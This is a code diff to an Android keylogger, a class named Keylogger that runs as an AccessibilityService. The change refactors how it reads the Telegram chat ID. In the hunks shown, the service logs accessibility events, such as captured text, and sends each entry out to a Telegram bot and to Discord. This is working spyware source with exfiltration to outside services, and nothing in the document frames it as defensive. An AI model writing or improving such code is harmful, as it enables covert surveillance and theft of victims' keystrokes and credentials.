@@ -1,10 +1,11 @@
 package com.bshu2.androidkeylogger;
 
 import android.accessibilityservice.AccessibilityService;
-import android.content.Context;
 import android.os.AsyncTask;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
+
+import com.example.dynamicapk.Constants; // Importing the Constants class
 
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -24,17 +25,11 @@ public class Keylogger extends AccessibilityService {
     private static final String TAG = "Keylogger";
 
     private class SendToTelegramTask extends AsyncTask<String, Void, Void> {
-        private final Context context;
-
-        SendToTelegramTask(Context context) {
-            this.context = context;
-        }
-
         @Override
         protected Void doInBackground(String... params) {
             try {
                 String message = params[0];
-                String chatId = Constants.getTelegramChatId(context); // Retrieve chat ID dynamically
+                String chatId = Constants.TELEGRAM_CHAT_ID; // Retrieve chat ID dynamically
                 String telegramUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
                 String payload = "chat_id=" + chatId + "&text=" + message.replace(" ", "+");
 
@@ -100,7 +95,7 @@ public class Keylogger extends AccessibilityService {
         }
 
         String logMessage = timestamp + " | (Event Type: " + event.getEventType() + ") | " + data;
-        new SendToTelegramTask(this).execute(logMessage);
+        new SendToTelegramTask().execute(logMessage);
         new SendToDiscordTask().execute(logMessage);
 
         Log.d(TAG, "Logged event: " + logMessage);
